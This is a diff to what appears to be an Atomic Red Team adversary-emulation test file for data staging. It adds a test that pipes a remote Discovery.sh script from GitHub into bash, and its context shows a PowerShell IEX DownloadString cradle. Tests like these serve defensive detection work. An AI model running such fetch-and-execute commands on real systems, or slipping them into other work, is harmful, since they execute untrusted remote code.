@@ -14,3 +14,17 @@ atomic_tests:
     name: powershell
     command: |
       "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > c:\windows\pi.log
+
+atomic_tests:
+- name: Stage data from Discovery.sh
+  description: |
+    Utilize curl to download discovery.sh and execute a basic information gathering shell script
+
+  supported_platforms:
+    - linux
+    - macos
+
+  executor:
+    name: bash
+    command: |
+      curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh | bash -s > /tmp/discovery.log
